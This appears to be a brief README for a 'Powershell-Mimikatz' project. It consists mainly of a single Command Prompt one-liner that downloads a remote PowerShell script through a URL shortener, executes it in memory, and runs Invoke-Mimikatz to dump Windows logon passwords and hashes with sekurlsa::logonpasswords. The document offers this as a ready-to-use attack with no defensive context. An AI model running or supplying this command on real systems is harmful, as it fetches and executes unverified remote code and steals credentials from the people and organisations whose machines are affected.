# Powershell-Mimikatz

For loading Mimikatz directly into ram.

Use this to use from Command Prompt:
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/Rtizcl'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'"
